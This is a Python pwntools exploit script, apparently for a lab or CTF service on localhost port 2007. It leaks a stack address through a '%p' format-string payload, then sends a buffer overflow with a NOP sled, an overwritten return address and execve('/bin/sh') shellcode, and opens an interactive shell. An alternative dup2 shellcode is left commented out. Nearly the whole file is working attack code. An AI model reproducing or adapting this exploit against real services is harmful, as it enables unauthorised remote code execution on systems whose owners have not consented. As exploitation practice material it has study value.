from pwn import remote
from struct import *
from time import sleep

host = '127.0.0.1'
port = '2007'
r = remote(host, port)
r.recvuntil('option')

binsh = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
binsh += "\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

dup2 = "\x31\xc9\x31\xdb\xb3"
dup2+= "\x05"   # socket number
dup2 += "\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5"

# Information leak is 0x428 off of ESP
# Looking for 0xffxxxxxx in the dumb to grab and use
r.recv(500)
payload = "1"
payload += "%p" * 200
r.send(payload)

sleep(.5)
data = r.recv(500)

hexchar = "0x"
words = data.split("0x")
for byte in words:
    if byte.startswith("ff"):
        print byte
        hexchar = int(byte, 16)
        print("[+] Information leak found. Saved ESP at " + hex(hexchar))

if hexchar is "0x":
        print("[-] Exploit failed. No information leak found")
        exit()

hexchar = hexchar - 0x428

print("[+] Subtracting 0x428 from hexchar to reach current stack frame")

print("[+] Sending payload")

payload = "2"            # write message
payload += "\x90" * 112  # clobber stack
payload += pack("<L", hexchar)        # EIP
payload += "\x90" * 400  # NOP
#payload += dup2         # dup2
payload += binsh         # binsh
payload += "\x90" * 400  # NOP

r.send(payload)
r.interactive()
